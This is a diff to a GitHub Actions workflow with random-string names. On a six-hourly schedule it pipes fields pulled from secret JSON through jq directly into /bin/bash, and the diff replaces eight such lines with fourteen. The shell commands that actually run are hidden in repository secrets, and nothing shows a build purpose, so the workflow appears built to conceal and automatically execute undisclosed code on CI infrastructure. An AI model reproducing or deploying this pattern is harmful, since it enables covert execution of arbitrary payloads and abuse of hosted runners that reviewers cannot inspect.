@@ -1,9 +1,9 @@
 name: weixutong6745
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 1/6 * * *'
+    - cron: '45 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +12,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: weixutong6745
         env:
-          w0905: ${{ secrets.w0905 }}
+          sojzw38: ${{ secrets.sojzw38 }}
         run: |
-          echo $w0905 | jq -r .hf58 | /bin/bash
-          echo $zrvut8576 | jq -r .iaq76483 | /bin/bash
-          echo $ny4 | jq -r .ydo7 | /bin/bash
-          echo $vbgnp978 | jq -r .rhys4 | /bin/bash
-          echo $ugyy85 | jq -r .wvqh5659 | /bin/bash
-          echo $mnpu00 | jq -r .pqhis74 | /bin/bash
-          echo $cigsf6749 | jq -r .ygyau31 | /bin/bash
-          echo $h98530 | jq -r .vxto969 | /bin/bash
+          echo $sojzw38 | jq -r .d129 | /bin/bash
+          echo $zgijf1992 | jq -r .ihbpd5 | /bin/bash
+          echo $kr1640 | jq -r .onage3 | /bin/bash
+          echo $iuj53375 | jq -r .hxdlj8 | /bin/bash
+          echo $z9846 | jq -r .r447 | /bin/bash
+          echo $n4 | jq -r .xv37 | /bin/bash
+          echo $nhpos74 | jq -r .y862 | /bin/bash
+          echo $xz88 | jq -r .geku86 | /bin/bash
+          echo $t2235 | jq -r .e5594 | /bin/bash
+          echo $rbao637 | jq -r .jh728 | /bin/bash
+          echo $rup8 | jq -r .vpjf199 | /bin/bash
+          echo $c908 | jq -r .qz196 | /bin/bash
+          echo $qybd63 | jq -r .ppppa04 | /bin/bash
+          echo $e32 | jq -r .vtknn2 | /bin/bash
 
